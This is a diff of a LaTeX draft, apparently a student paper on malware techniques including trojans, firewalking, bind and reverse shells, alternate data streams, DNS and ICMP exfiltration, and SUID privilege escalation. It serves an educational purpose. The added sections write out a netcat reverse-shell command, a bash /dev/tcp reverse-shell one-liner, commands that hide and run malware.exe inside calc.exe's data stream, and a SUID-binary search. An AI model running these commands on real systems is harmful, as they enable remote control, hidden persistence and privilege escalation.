@@ -53,7 +53,6 @@ The price tag pertains to the huge amount of systems running windows as a base, 
 \section{Historic \& Modern Malware Threats}
 \subsection{Heartbleed}
 
-
 \subsection{Loveletter}
 
 \subsection{SQLSlammer}
@@ -109,7 +108,7 @@ can lead to a worldwide compromise in hours given the right circumstances. \cite
 
 Trojans are by far the most common pick as of writing for a budding computer hacker. They similar to viruses in that they interact with applications, and that they both require some user interaction to start. The differences lie in behaviour before and after infection. 
 They prefer to masquerade as legitimate programs, that upon exection, do something different entirely, or serve a secret purpose to just what the cracked software or emailed document that was inevitably downloaded for. They do not replicate, prefering to create C2 structures with backdoors,
-and employ remote access trojan tactics (RAT) of creating persistance, often in the form of covert screensharing. \citep{virusVsTrojan}
+and employ remote access trojan (RAT) tactics of creating persistance, often in the form of covert screensharing. \citep{virusVsTrojan}
 
 %Find something to backup RATs
 
@@ -192,17 +191,6 @@ A criminal can use information gathered to hone in later attacks for full effect
 
 \subsection{NMAP}
 Nmap is an extreamly useful networking application that allows for a great deal of network reconnaissance. It's main use being the mapping out of networks, as the name would suggest.
-
-Host Discovery Scan (Subnet Scoped):
-\begin{tcblisting}{listing only}
-    nmap -sn 192.168.1.1-254
-\end{tcblisting}
-
-Noisy Host Probing Scan:
-\begin{tcblisting}{listing only}
-nmap -sC -sV -vvv -oA  ~/Documents/nmapscan.txt 192.168.1.50
-\end{tcblisting}
-
 %other tools listed in ToR
 
 \subsubsection{Fingerprinting \& Banner Grabbing}
@@ -215,9 +203,25 @@ This is impactful as OS version and architecture disclosure means exploits are f
 
 These are trivial examples, but show that exposure can lead to the "hacker mindset" being utilised.
 
+Host Discovery Scan (Subnet Scoped):
+\begin{tcblisting}{listing only}
+    nmap -sn 192.168.1.1-254
+\end{tcblisting}
+
+Noisy Host Probing Scan:
+\begin{tcblisting}{listing only}
+nmap -sC -sV -vvv -oA  ~/Documents/nmapscan.txt 192.168.1.50
+\end{tcblisting}
+
+
 %icmp responce time, apache default page w version
 
 \subsection{Firewalking}
+Firewalking a technique of probing a firewall to check what is and isn't allowed. This process operates at layer 4, and means that the respecctive protocols can be interacted with, using conditoinal flags. The most common indentifiers are IP, MAC, subnet, port and VLAN.
+It is achieved by creating a layer 4 packet that has a TimeToLive value 1 higher than the gateway. The packet will attempt to pass through the firewall, and will return ICMP_TIME_EXCEEDED if passed succesfully, otherwise the packet was likely dropped. Firewalk is the tool native
+to Kali Linux that uses this methodology to help map out the network. \citep{Firewalk}
+
+A potential use case is to see what is and isn't blocked to make an educated guess on where valuable infrastructure is, and to potentially spoof a layer 2 or 3 address to bypass firewall restrictions.
 
 \subsection{Network Pivotting}
 One of the most potent traits of malware (particually worms) is their ability to spread rappidly. Once malware has a foothold in a network, it can take advantage of the networked nature of infrastructure to check what that machine can talk to.
@@ -246,7 +250,6 @@ The inverse is true, it can be an asset to create awareness of exposure and help
 Social engineering is the art of exploiting the inherent vulnerabilities that lie within humanity. Access is most easily leveraged by manipulating someone, especially compared to finding the needle in the haystack regarding finding a relevant vulnerability at the machine level. 
 Consider the example in which the main company database has been secured; all the software is up the date, the passwords strong and properly stored as hashes. What if instead of traditional hacking methodologies, someone simply walked in with a high visibility jacket and walked out with the system, 
 citing maintenance as the reason. \citep{AssignmentSecurityForensicsPaper}
-
 
 
 \subsection{Phishing}
@@ -298,7 +301,6 @@ This could mean that you could only allow certain MAC addresses to talk to a rou
 This can be accomplished with the tool 'macchanger'. \citep{IPMACSpoofing}
 
 The above approach would depend on the access control system in place. If there is a whitelist, the above method would have to be used, which requires knowledge of allowed MAC addresses. If a blacklist is in place, a device could simply use the tool to switch it to something that is not on the block list, perhaps by changing the vendor. If the blacklist is aggressive, and dynamic, then macchanger can be leveraged to respoof the MAC on each boot.
-
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
@@ -353,22 +355,32 @@ The point being is that Denial of Service alone is a type of attack rather than 
 \citep{AssignmentDOSPaper}
 
 
-\section{Bind & Reverse Shells}
-A Bind/Remote shell is you connecting from your machine to the shell. This is more of a backdoor. This is usually blocked by firewalls and can be ruined by change of ports, additionally DHCP and NAT cause IPs to change and as a result you do not know the IP of the listener you have setup.
-A reverse shell is the shell connecting to a listening service (Netcat) on your machine.
+\section{Bind vs Reverse Shells}
+A Bind/Remote shell is connecting from 'hacker' to victim and establishing a terminal session over IP. This is more of a backdoor, usually once initial compromise has aready occured. 
+This activity usually seen by firewalls and can be ruined by change of ports, additionally DHCP and NAT cause IPs to change and as a result, the IP of the host, and therefore the listener is unknown.
 
-Netcat lets us set up connections between a host and a listener. You can also connect to any listener that is not yours also, which is referred to as banner grabbing, simply using nc on a ip port can do this. 
-A useful. 
+A reverse shell is the inverse, the victim machine connecting the the 'hacker's' listener. This requires that some form of exploit is conducted, in order to run the arbitrary code required. This does mean passing an IP and port over the network, in order to establihs a connection, however a combination of TLS and proxy chains could help avert this issue.
+
+Netcat lets a threat actor set up connections between a host and a listener. There is the ability to also connect to any listener that is not nativly netcat based, which is referred to as banner grabbing, simply using nc on a ip port can do this. There are different implementations of netcat, such as nc and Nmap's ncat. \citep{Ncat} 
+
+ncat -lvp 1234
+nc 192.168.0.240 1234 -e cmd.exe or /bin/sh or whatever shell/program
 
 Let’s say we have found a remote code execution (RCE) vulnerability on the target host. We can than issue the Netcat command with –e on the target host and initiate a reverse shell with Netcat to issue commands.
 
-MSFVenom
+Alternate Tools \& One Liners:
 
-Reverse shells can be over TLS
+\begin{tcblisting}{listing only}
+bash -i >& /dev/tcp/<IP>/<port> 0>&1 - A one liner that can be injected into most unix systems to grant a shell.
+MSFVenom - The Metasploit Framework payload creation tool, full of modules for different architectures that safe time so long as they are understood. 
+Pwncat - A modern version of reverse shell technology, creates a C2 structure for better persistance, priv esc, stability, ease of use and control.
+\end{tcblisting}
 
+\citep{PentestMonkey}
+\citep{MSFVenom}
+\citep{Pwncat}
 %reference zeus, mirai
 %pwncat - bit noisy tho
-
 
 
 \section{Data Cryptors}
@@ -399,7 +411,7 @@ More secure:
 strncpy(var2, var1, sizeof(var2)); 
 \end{tcblisting}
 
-This is a very in depth topic, that is somewhat out of scope beyond this.
+This is a very in depth topic, that is somewhat out of scope, beyond this.
 
 
 \section{Payload vs Shellcode}
@@ -470,9 +482,10 @@ on dynamic behaviourial analysis.
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
-\chapter{Malware Mechanisms - Obfuscation}
-The idea being to muddle up the binary, making it really hard to analyze. There are certain details that are criticial, IP addresses, URLs, locations, registry keys. Onfuscation is inherintly dependant on some creativity, and so,
+\chapter{Malware Mechanisms - Obfuscation \& Compression}
+Obfuscation is the art of hiding information, to prevent it from being explicitly viewed by those who wish to use it against the hacker. The idea being to muddle up the binary, making it really hard to analyze. There are certain details that are criticial, IP addresses, URLs, locations, registry keys. Onfuscation is inherintly dependant on some creativity, and so,
 this list is not intended to be comprehensive, but shows the fundamental behaviours they all exhibit.
+\begin{enumerate}
     \item [$\bullet$] Unescape String
     \item [$\bullet$] From Hex
     \item [$\bullet$] From Charcode
@@ -483,7 +496,6 @@ this list is not intended to be comprehensive, but shows the fundamental behavio
     \item [$\bullet$] Magic
 \end{enumerate}
 
-\subsection{Steganography}
 
 \section{Encoding vs Encryption}
 Encoding is a process in which we represent data in a different format. A simple way to think of this is that A = 1, B = 2. Data representation works in the same way,
@@ -541,6 +553,55 @@ Dynamic analysis may detect this based on the actions conducted. AV can set up a
 known activities regardless of hash, and look at decrypted memory.
 
 This can be defeated (like everything), by having abrupt delays to throw the system off, lets say before and after decrypting, or overloading memory with junk to throw it off
+
+\section{Steganography}
+- Hiding data within something else
+- Often done on images
+- Steghide can be used
+- Data can be executed on view of file
+- Can be used to sneak data into a system, or to hide from authorities - Mr Robot CDs
+- Trade off between maintaining quality and the amount of data stored.
+- Criminals love reusing old malware in new and odd ways.
+- It's something that is old but people don't think about, a large enthasis on networks.
+- The Sundown Exploit Kit, Vawtrak and Gatak/Stegoloader  employ stenography as a vector.
+- Low risk compared to other threats, it doesn't get the same numbers even with a botnet
+- Malware was found in memes a little while ago, quite widespread, that then contacted a C2. 
+- It then downloads more code to actually have some form of affect. The crazy thing is, it doesnt just directly download them, it goes onto twitter and downloads more images which have instructions! It does a search for specific image tags that are clearly theirs, such as /print for print screen etc..
+
+\section{Alternate Data Streams}
+Alternate Data Streams, often abbreviated as ADS, is a method of hiding information in the metadata portion of a file. This could be used to avoid having to represent data explicity, such as in a text file, which is much more loud in computer forensic sense. ADS messages are not viewable by default, and so could easily slip through manual detection measures.
+ADS came about for NTFS and HFS+ in order to accomodate the extra metadata fields that Macintosh based systems operate with, creating cross-compatability. Whole files can be hidden inside another, which is a crude version of obfuscation. The data can be viewed fairly easily, but requires knowledge of this as a practise. \citep{ADS}
+
+Typically data is stored in the :\$DATA portion of the file, and malicious data can be injected into the zone identifier, and also exectuted from.
+
+Implantation:
+\begin{tcblisting}{listing only}
+    type c:\malware.exe > c:\Windows\system32\calc.exe:malware.exe
+\end{tcblisting}
+\citep{ADS}
+
+%not displaying properly
+
+This will implant the malware.exe into the alternate data stream of calc.exe, letting a threat actor covertly hide malware or secret information, to later be executed or read.
+
+Execution:
+\begin{tcblisting}{listing only}
+    start c:\Windows\system32\calc.exe:malware.exe" 
+    wmic process call create '"c:\Windows\system32\calc.exe:malware.exe"'
+\end{tcblisting}
+\citep{ADScommands}
+
+Start previously worked, and is now blocked, however wmic still works.
+
+%still need to try myself
+
+Detection:
+\begin{tcblisting}{listing only}
+dir -R
+\end{tcblisting}
+
+A positive us of ADS comes in the automated scanning of files - often in the ADS in case of malicious payload injection. This is particully prevelant with downloaded files, the origin of the file is stored in the ADS by the browser.
+This lets security software have an extra conditonals to check for to aid detection upon periodic scan or execution. \citep{ADSUse} There is a compressed version of ADS that are difficult to spot to due
 
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
@@ -672,7 +733,7 @@ Much better:
 
 \subsubsection{DNS Tunneling}
 There are multiple vectors in the DNS protocol to attach meaningful variance; 
-The domain name itself that is attempted to be resolved as discussed, using common queries such as A or AAAA and tunneling other protocols as payloads
+The domain name itsself that is attempted to be resolved as discussed, using common queries such as A or AAAA and tunneling other protocols as payloads
 through the query payload of the DNS query. Depending on the throughput needed, the requests can be segmented to be more covert, as tunneling 
 high bandwidth protocols through DNS can be quite loud in respective to detection software. \citep{DNSExfiltration} Common tunneled protocols include
 SSH, HTTP and HTTPS. SSH and HTTPs have the benefit of having obfuscation in encryption, rather than just hiding http downloads in clear text encoded base64 \citep{DNSTunneling}
@@ -739,7 +800,6 @@ There are tools capable of conducting such techniques; these include:
     \item Iodine - "IP over DNS tunneling client" \citep{iodine}
     \item DET - "Data Exfiltration Toolkit" \citep{DET}
 \end{enumerate}
-NotI
 
 %good table for tools
 %snort apparenlty has lists for certain kinds of malicous traffic, including thism, sometimes with regex (snort)
@@ -756,9 +816,12 @@ ICMP is a control message protocol for IP that lets a host ping another host to 
 The latter relies on fields within the protocol having storage capacity for variable data for exfiltration. These tend to be unused or optional fields, with one process writing to them, and another stripping it out. The ICMP data payload inside the frame is the most obvious location, but it being under the ICMP banner, can help divert attention elsewhere. There are other less obvious places that data could be placed, but that is out of scope for this paper. \citep{ICMPExfiltration}
 
 Ping can be leveraged to specify it's 16 byte ECHO\_REQUEST field's contents. The source states that a simple Scapy Python script can be used in combination with timing and payload switches of the ping utility, to exfiltrate data under the ICMP protocol. This relies on compression of data into hexadecimal, and to then sneak that into intervaled bytes that the listener/sniffer on the malicous server will then strip and write to a file. \citep{pingExfil}
+
+For the purposes of this paper, DNS will be the focus, however, ICMP is a useful asset for the above use cases.
+
 %would be good to try out!
 
-%could talk deeper on the process
+%might have to just focus on DNS, exfil is already long enough
 %reference exfiltration  by obfuscation - twiiter bot
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
@@ -867,7 +930,7 @@ The following is possible otherwise. We could use this attack in a input that ru
 
 %an example?
 
-\subsection{Scheduler Manipulation}
+\subsection{Scheduler \& Permission Manipulation}
 Linux systems use cron, and windows systems use task scheduler. They both allow for administrators to automate tasks. The use case is usually for an on-boot task, or perodically ran for backups and other important jobs.
 THey save the administrator from having to run it manually, leaving them to do other jobs. They are invaluable for backup hygiene, as well as autostarting important programs. While these schedulers can run single commands, 
 they are often given scripts for which to run at their defined time. The programmer in this case does not have to worry about scheduling code, they let the OS sort it out with their defined settings. The script will do 'x'
@@ -877,16 +940,25 @@ The problem arises in the permissions of the potentially variable file. The scri
 , if exploited could also run arbitrary code. A particually nasty attack vector is the write permission of the script. If not secured so that only system level permissions can edit it, potentially any user can alter it.
 A user account could be hijacked, and then attempt to write to a scheduled script file. The user writing to the file may not be the one running it periodically, and as such any changes could be ran as the system/root user.
 
+\subsubsection{Sudo Permission Abuse:}
+There is another vulnrability in unix based systems called SUID exploitation in which programs have permissions assigned which say who can use the sudo command, as what user, on what binaries, that do not consider how that permission might be used. If a threat actor gained a shell onto a system as a given user, they could
+use it to scan for 'S' bits on the permission section. The 'S' represents who can run a program as a different user, often without a password. The ability to run code as another, sometimes more privilege user means that there may be potential to abuse the application 
+into using it's power to grant a shell, under that user. GTFObins is a useful resource for this use case, it is a repository of known exploitation strings. \citep{GTFOBins}
 
-\subsection{SUID Manipulation}
-%gtfobins
-%sudo -l
+Scan for SUID binaries for a given user:
+\begin{tcblisting}{listing only}
+find / -user <user> -perm -4000 -exec ls -ldb {} \;
+sudo -l
+\end{tcblisting}
 
-\subsection{User Account Creation}
-\section{Process Hijacking}
-%dunno about this stuff
+These are attack vectors, and as such means that there is a RCE vulnrability if left unsecured. An attacker could use it to leverage postion, pivot to another user, and plant persistance with a new user of privilege. Equally, persistance could be gained by binding to
+a 'trusted' process which has privilege. Applications like Windows File Explorer and Notepad have inherent trust and privilege in the system, and as such if malware binds their respective, it can remain there for sometime. Binding to a prcoess can be done using the above DLL hijacking,
+and also with the use of meterpreter modules once in the system. Meterpreter also has the benefit of using the hijacked process as a tunnel to run trhough commands through, and so can be leveraged to quickly comb through infrastructure. 
 
-\section{Symbolic Locations}
+Implantation of SSH keys is a common tactic, they do not require passwords or a user, rather a public key that is unique to the hacker's device. A sample of how native applicaitons can be abused is Notepad itself. Notepad is a text editor in nature, meaning it has read and write permissions, of a given user. It is a convinient way of delivering malware payloads into local malware scripts, often with great speed.
+
+
+% \section{Symbolic Locations}
 %urandom - maybe
 %/dev/shm
 %/dev/udp - think thats it?
@@ -904,9 +976,11 @@ A user account could be hijacked, and then attempt to write to a scheduled scrip
 %consider empty sections and subsections that only host children
 
 %sections to do:
-%priv esc techniques
-%icmp exfil
 %malware examples
+%stego
+%ads
 
 %look at other notes
 %go through and reference/cite later and earlier content, particually in the malware sections
+%MAC is software based, based on the hardware
+%ARP spoofing can make traffic destined for the router, go to you, man in the middle. detect spoofing? BEttercap can do this
